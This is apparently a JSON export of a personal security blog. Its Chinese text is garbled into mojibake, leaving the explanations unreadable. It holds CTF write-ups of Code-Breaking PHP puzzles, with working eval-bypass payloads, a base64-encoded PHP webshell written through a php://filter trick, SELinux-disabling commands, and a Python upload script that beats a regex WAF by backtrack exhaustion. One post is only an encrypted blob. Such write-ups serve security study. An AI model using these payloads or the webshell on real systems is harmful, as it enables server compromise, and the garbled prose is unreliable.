{"meta":{"title":"æ…¢å°±æ˜¯å¿« | glotozz'blog","subtitle":"è¿™ä¸ªäººæ¯”è¾ƒèœï¼Œä»€ä¹ˆè¯ä¹Ÿç•™ä¸ä¸‹","description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"æ„Ÿè°¢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"è°¢è°¢æ”¯æŒæˆ‘çš„å°ä¼™ä¼´"}],"posts":[{"title":"codebreaking-5","slug":"codebreaking-5","date":"2019-08-15T01:00:44.000Z","updated":"2019-08-15T01:00:44.793Z","comments":true,"path":"2019/08/15/codebreaking-5/","link":"","permalink":"http://yoursite.com/2019/08/15/codebreaking-5/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"codebreaking-4","slug":"codebreaking-4","date":"2019-08-14T23:16:56.000Z","updated":"2019-08-15T01:00:22.958Z","comments":true,"path":"2019/08/15/codebreaking-4/","link":"","permalink":"http://yoursite.com/2019/08/15/codebreaking-4/","excerpt":"æ–°çš„ä¸€å¤©ï¼Œå†åšå‡ é¢˜ï¼Œç­‰ä¸‹9ï¼š30å¼€å§‹åšichunqiuä¸Šçš„ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›ï¼Œå¸Œæœ›å¤§ä½¬ä»¬å¸¦æˆ‘é£ğŸ˜˜","text":"æ–°çš„ä¸€å¤©ï¼Œå†åšå‡ é¢˜ï¼Œç­‰ä¸‹9ï¼š30å¼€å§‹åšichunqiuä¸Šçš„ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›ï¼Œå¸Œæœ›å¤§ä½¬ä»¬å¸¦æˆ‘é£ğŸ˜˜ easy - phplimit123456&lt;?php if(&apos;;&apos; === preg_replace(&apos;/[^\\W]+\\((?R)?\\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123; eval($_GET[&apos;code&apos;]); &#125; else &#123; show_source(__FILE__); &#125; é¦–å…ˆæ­å»ºç¯å¢ƒï¼Œæ˜¯nginxï¼Œå…ˆç”¨phpstudyçš„nginxæ­å»ºè¯•è¯•ï¼Œä¸è¡Œå†ç”¨linuxè™šæ‹Ÿæœº(ï¿£â–½ï¿£)â€ åŸé¢˜æ˜¯rctfçš„r-cursiveï¼Œä¸¤é¢˜çš„æ„æ€éƒ½æ˜¯åªèƒ½ä¼ å…¥å‡½æ•°ï¼Œé»é‚£ä¸ªc (?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œå³å¯ä»¥ç”¨\\w+((?R)?)æ›¿æ¢åˆ°(?R)çš„ä½ç½®ï¼Œå› æ­¤å¯ä»¥è¡ç”ŸæˆåŒ¹é…\\w+(\\w+((?R)?))ã€\\w+(\\w+(\\w+((?R)?)))ã€â€¦(?R)? è¿™é‡Œå¤šä¸€ä¸ª?è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ã€‚ åŸç†æ˜¯åˆ©ç”¨phpçš„getallheaders()ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®uaæ¥ä¼ å…¥å­—ç¬¦ä¸²ï¼ŒæˆåŠŸæ‰§è¡Œæˆ‘æƒ³è¦çš„å‘½ä»¤ã€‚è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹çœ‹phpinfoçš„å†…å®¹ã€‚ payloadï¼š ?code=eval(implode(array_reverse(getallheaders()))); åœ¨headersçš„Hostä¸Šé¢ä¸€è¡Œæ·»åŠ  1: phpinfo();// éœ€è¦çš„æ³¨æ„çš„æ˜¯getallheaders()å¥½åƒæ˜¯é»˜è®¤æ˜¯é€†åºçš„ï¼Œæˆ‘åŠ äº†var_dump()æŸ¥çœ‹ okï¼Œæœ¬é¢˜æ€è·¯ç±»ä¼¼ï¼Œä½†æ˜¯nginx æˆ‘è¯•äº†è¯•ä¸Šé¢çš„payloadï¼Œå±…ç„¶ä¹Ÿå¯ä»¥ï¼Ÿï¼Ÿï¼Ÿï¼ŸğŸ˜¢ æœ¬æ¥getallheaders()æ˜¯apacheæ¨¡å—çš„å‡½æ•°ï¼Œå¯èƒ½æ˜¯phpstudyçš„nginxç¯å¢ƒé—®é¢˜ï¼Œæˆ‘æ²¡æœ‰å¯¹nginxè¿›è¡Œé…ç½®ã€‚ å‡è£…è¿™æ˜¯ä¸è¡Œçš„ï¼Œå¯»æ‰¾nginxä¸­èƒ½ä»£æ›¿getallheaders()çš„å‡½æ•° get_defined_vars()è¿”å›æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œè¿™ä¸ªå·²å®šä¹‰çš„å˜é‡é‡Œå°±åŒ…æ‹¬äº†$_GETã€$_POSTç­‰æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡ï¼Œæ‰€ä»¥æŠŠè¦æ‰§è¡Œçš„ä»£ç å†™åœ¨å…¶ä»–çš„getå‚æ•°é‡Œå³å¯ æ„é€ payloadï¼š ?aa=phpinfo();//&amp;code=eval(implode(reset(get_defined_vars()))); é™„ä¸Šå¦ä¸€ä¸ªå¤§å¸ˆå‚…çš„payloadï¼š 1?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); d=====(ï¿£â–½ï¿£*)b å‚å¡é“¾æ¥ï¼šhttps://lorexxar11.cn/2018/05/23/rctf2018/ http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-3","slug":"codebreaking-3","date":"2019-08-14T07:35:35.000Z","updated":"2019-08-14T23:21:15.967Z","comments":true,"path":"2019/08/14/codebreaking-3/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-3/","excerpt":"ç¬¬ä¸‰é¢˜leiå•¦æ‹‰æ‹‰ easy - phpmagic","text":"ç¬¬ä¸‰é¢˜leiå•¦æ‹‰æ‹‰ easy - phpmagic 12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET[&apos;read-source&apos;])) &#123; exit(show_source(__FILE__)); &#125; define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;])); if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true); &#125; chdir(DATA_DIR); $domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;; $log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;); if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output; endif; ?&gt; escapeshellarg()æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ï¼Œå°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚ htmlspecialchars()å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ è€Œä¸€å¥è¯æœ¨é©¬éœ€è¦&lt; é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œè§£å†³&lt;è¢«è½¬ä¹‰çš„é—®é¢˜ file_put_contents($log_name, $output); åœ¨file_put_contents()ä¸­ï¼Œ$log_nameå¯ä»¥è®¾ç½®è¯»å–æ–‡ä»¶å†…å®¹è§£ç ï¼Œé‚£ä¹ˆåªéœ€è¦å°†æ–‡ä»¶å†…å®¹base64ç¼–ç å³å¯ æµ‹è¯•å‘ç°ï¼š éœ€è¦æŠŠæœåŠ¡å™¨éƒ¨ç½²åˆ°linuxä¸Šï¼Œå› ä¸ºwindowsä¸­æ²¡æœ‰digè¿™ä¸ªå‘½ä»¤ğŸ˜” $log_nameæ˜¯å–è‡ªhttpå¤´ä¸­çš„host è€Œ$outputä¸­æœ‰ä¸€éƒ¨åˆ†å†…å®¹æ˜¯domain ç¬¬äºŒæ­¥ï¼Œè§£å†³æ–‡ä»¶åç¼€çš„é—®é¢˜ åªè¦åœ¨åç¼€åååŠ ä¸Š/. pathinfoå°±å–ä¸åˆ°åç¼€åï¼Œä¸”å¯ä»¥æ­£å¸¸å†™å…¥.phpä¹‹ä¸­ã€‚å…·ä½“åŸç†å¯ä»¥å‚è€ƒé“¾æ¥ğŸ˜€ï¼Œphpåœ¨å¤„ç†è·¯å¾„çš„æ—¶å€™ï¼Œä¼šé€’å½’çš„åˆ é™¤æ‰è·¯å¾„ä¸­å­˜åœ¨çš„/. è§£ç ä¸­é‡åˆ°ä¸ç¬¦åˆè§„èŒƒçš„å­—ç¬¦ç›´æ¥è·³è¿‡ã€‚æ‰€ä»¥è™½ç„¶æˆ‘ä»¬åªèƒ½æ§åˆ¶ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä½†æ˜¯å…¶ä»–å†…å®¹å¹¶ä¸å½±å“base64è§£ç ã€‚å¦å¤–å› ä¸ºbase64è§£ç æ˜¯4ä½4ä½çš„è§£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿è¯æˆ‘ä»¬éœ€è¦è§£ç çš„å­—ç¬¦ä¸²ä¹‹å‰çš„åˆæ³•å­—ç¬¦æ•°ä¸º4çš„å€æ•°ï¼Œå­—ç¬¦èŒƒå›´æ˜¯Aâ€”Zï¼Œaâ€”zï¼Œ0â€”9ï¼Œ+ï¼Œ/ æµ‹è¯•ï¼š æœé›†åˆšæ‰çš„xxxå¾—åˆ°çš„ç»“æœï¼ˆæ³¨æ„å»æ‰ç¬¦å·ï¼‰ä¸º ltltgtgtDiG994RedHat99474el762ltltgtgttAqï¼Œé•¿åº¦ä¸º41ï¼Œæ‰€ä»¥éœ€è¦å…ˆè¡¥å……3ä¸ªæ²¡ç”¨çš„aaaã€‚è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œbase64ä¸­çš„=åªèƒ½å‡ºç°åœ¨æœ€æœ«å°¾ï¼Œè€Œæˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²æ˜¯åœ¨ä¸­é—´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²é‡Œä¸èƒ½æœ‰= åœ¨çº¿çš„base64ä¸­å­˜åœ¨ ==ï¼Œç”¨phpçš„base64_encodeä¸å­˜åœ¨ == payload: host:php ?domain=aaaPD9waHAgQGV2YWwoJF9HRVRbJzEyMyddKTs/Pg&amp;log=://filter/convert.base64-decode/resource=a3.php/. ä½†æ˜¯åˆå¥‡äº†ä¸ªæ€ªï¼Œæ€ä¹ˆä¹Ÿå†™ä¸è¿›å»ã€‚ã€‚ã€‚ file_put_contents()è¯¥å‡½æ•°å°†è¿”å›å†™å…¥åˆ°æ–‡ä»¶å†…æ•°æ®çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥æ—¶è¿”å›FALSE var_dump(file_put_contents())å‘ç°ç¡®å®æ˜¯falseï¼Œæƒé™ä¹Ÿæ”¹æˆ777äº†ï¼Œæˆ‘cao åˆæ˜¯ä¹‹å‰é‡åˆ°è¿‡çš„é‚£ä¸ªé—®é¢˜ï¼Œçªç„¶æƒ³èµ·æ¥centos7éœ€è¦ å…³é—­SELINUX 1234&gt; vi /etc/selinux/config&gt; SELINUX=disabled #å¢åŠ ï¼Œåˆ«çš„éƒ½æ³¨é‡Šæ‰&gt; setenforce 0 #ä½¿é…ç½®ç«‹å³ç”Ÿæ•ˆ&gt; å†™å…¥æˆåŠŸï¼ï¼ğŸ˜€ ä¸€ä¸ªæ–‡ä»¶åªèƒ½å†™ä¸€æ¬¡ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ä¹Ÿä¼šå†™å…¥å¤±è´¥ å¦‚æœbase64ç¼–ç æœ€åå‡ºç°äº†==ï¼Œå¯ä»¥èˆå»ï¼Œå› ä¸ºæœ¬æ¥ä¹Ÿæ˜¯ç”¨æ¥è¡¥å…¨çš„ å‚è€ƒé“¾æ¥http://wonderkun.cc/index.html/?p=626#comments https://paper.seebug.org/755/#easy-phpmagic http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"æœªå®Œæˆçš„seacms","slug":"æœªå®Œæˆçš„seacms","date":"2019-08-14T04:02:41.000Z","updated":"2019-08-14T04:36:23.431Z","comments":true,"path":"2019/08/14/æœªå®Œæˆçš„seacms/","link":"","permalink":"http://yoursite.com/2019/08/14/æœªå®Œæˆçš„seacms/","excerpt":"æ˜¨å¤©å¤ç°äº†chinazä¸­çš„3ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå…¶ä¸­ç¬¬3ä¸ªè™½ç„¶å¤ç°æˆåŠŸäº†ï¼Œä½†æ˜¯å¯¹payloadè¿˜æ˜¯ä¸å¤ªæ‡‚ï¼ŒåŸç†ä¸æµ·æ´‹CMSç±»ä¼¼ï¼Œè¿™é‡Œå°±æ¥å¤ç°ä¸‹æµ·æ´‹CMS","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } } 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 var onError = function(error) { document.getElementById(\"enc_error\").innerHTML = \"password error!\" }; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"}]},{"title":"codebreaking-2","slug":"codebreaking-2","date":"2019-08-14T04:01:05.000Z","updated":"2019-08-14T07:52:34.527Z","comments":true,"path":"2019/08/14/codebreaking-2/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-2/","excerpt":"ç¬¬äºŒé¢˜leiå•¦å•¦å•¦","text":"ç¬¬äºŒé¢˜leiå•¦å•¦å•¦ easy - pcrewaf1234567891011121314151617&lt;?php function is_php($data)&#123; return preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, $data); &#125; if(empty($_FILES)) &#123; die(show_source(__FILE__)); &#125; $user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]); $data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]); if (is_php($data)) &#123; echo &quot;bad request&quot;; &#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path); header(&quot;Location: $path&quot;, true, 303); &#125; æ–‡ä»¶åä¸å¯æ§ï¼Œæ–‡ä»¶å†…å®¹å¯æ§ ä½†æ˜¯éœ€è¦ç»•è¿‡ preg_match(â€˜/&lt;?.[(`;?&gt;]./isâ€™, $data); å‚è€ƒé“¾æ¥é‡Œé¢çš„ pcre.backtrack_limit è¿™ä¸ªé…ç½®å†³å®šäº†åœ¨phpä¸­ï¼Œæ­£åˆ™å¼•æ“å›æº¯çš„å±‚æ•°ã€‚è€Œè¿™ä¸ªå€¼é»˜è®¤æ˜¯1000000. ä¸¾ä¸ªä¾‹å­ 123æ­£åˆ™ï¼š\\&lt;\\?.*[(`;?&gt;].*è¾“å…¥ï¼š&lt;?php phpinfo();//aaaaa 1234567891011121314åŒ¹é…è¿‡ç¨‹\\&lt; =&gt; &lt;\\? =&gt; ?.* =&gt; php phpinfo();//aaaaa [(`;?&gt;] =&gt; php phpinfo();//aaaa å¼€å§‹å›æº¯ 1 [(`;?&gt;] =&gt; phpinfo();//aaa 21[(`;?&gt;] =&gt; phpinfo();//aa 3[(`;?&gt;] =&gt; phpinfo();//a 4[(`;?&gt;] =&gt; phpinfo();// 5[(`;?&gt;] =&gt; phpinfo();/ 6[(`;?&gt;] =&gt; phpinfo(); 7[(`;?&gt;] =&gt; phpinfo() 8[(`;?&gt;] =&gt; phpinfo();.* =&gt; phpinfo();//aaaaa ä¸€å…±å›æº¯äº†8æ¬¡ å¯æƒ³è€ŒçŸ¥ï¼Œå›æº¯çš„æ¬¡æ•°æ˜¯æœ‰ä¸Šé™çš„ï¼Œé»˜è®¤æ˜¯100ä¸‡ï¼Œå¯ä»¥é€šè¿‡è¯­å¥æ¥æŸ¥çœ‹ 1234var_dump(ini_get(&apos;pcre.backtrack_limit&apos;));è¿”å›string(7) &quot;1000000&quot; å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº†100ä¸‡ï¼ŒæŸ¥çœ‹ 1234var_dump(preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo();//.str_repeat(&apos;c&apos;,1000000)&apos;));è¿”å›bool(false) æ‰€ä»¥ï¼Œè¿™é“é¢˜çš„ç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†ã€‚æˆ‘ä»¬é€šè¿‡å‘é€è¶…é•¿å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½¿æ­£åˆ™æ‰§è¡Œå¤±è´¥ï¼Œæœ€åç»•è¿‡ç›®æ ‡å¯¹PHPè¯­è¨€çš„é™åˆ¶ã€‚ 123456789import requestsfrom io import BytesIOfiles = &#123; &apos;file&apos;: BytesIO(b&apos;aaa&lt;?php phpinfo();//&apos; + b&apos;a&apos; * 1000000)&#125;res = requests.post(&apos;http://127.0.0.1/codebreaking/easy-pcrewaf/&apos;, files=files, allow_redirects=False)print(res.headers) è®¿é—®/data/f528764d624db129b32c21fbca0cb8d6å³å¯ï¼Œå…¶ä¸­data/åé¢æ˜¯md5(â€˜â€™) pç¥è¿˜æåˆ°äº†å¦ä¸€ç§æ›´å¸¸è§çš„waf 1234&lt;?phpif(preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123; die(&apos;SQL Injection&apos;);&#125; è¿™é‡Œæ¶‰åŠåˆ°äº†æ­£åˆ™è¡¨è¾¾å¼çš„â€œéè´ªå©ªæ¨¡å¼â€ã€‚å…·ä½“å‚è€ƒpç¥çš„é“¾æ¥ å›æº¯æ¬¡æ•°éšç€açš„æ•°é‡å¢åŠ è€Œå¢åŠ ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡å‘é€å¤§é‡aï¼Œæ¥ä½¿å›æº¯æ¬¡æ•°è¶…å‡ºpcre.backtrack_limité™åˆ¶ï¼Œè¿›è€Œç»•è¿‡WAF ä¿®å¤ä¹Ÿå¾ˆç®€å•ï¼šç”¨preg_matchå¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼Œä¸€å®šè¦ä½¿ç”¨===å…¨ç­‰å·æ¥åˆ¤æ–­è¿”å›å€¼ï¼Œ å‚è€ƒé“¾æ¥ï¼šhttps://paper.seebug.org/755/ https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html https://regex101.com","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-1","slug":"codebreaking-1","date":"2019-08-14T02:20:02.000Z","updated":"2019-08-14T04:19:09.122Z","comments":true,"path":"2019/08/14/codebreaking-1/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-1/","excerpt":"chrome+phpstormçš„è°ƒè¯•é—®é¢˜çœŸæ˜¯é†‰äº†ï¼Œæƒ³èµ·ä¹‹å‰çœ‹åˆ°åŒå­¦åœ¨åˆ·code breakingï¼Œæ­£å¥½å¯ä»¥çœ‹çœ‹é‚£ä¸ªğŸ˜€","text":"chrome+phpstormçš„è°ƒè¯•é—®é¢˜çœŸæ˜¯é†‰äº†ï¼Œæƒ³èµ·ä¹‹å‰çœ‹åˆ°åŒå­¦åœ¨åˆ·code 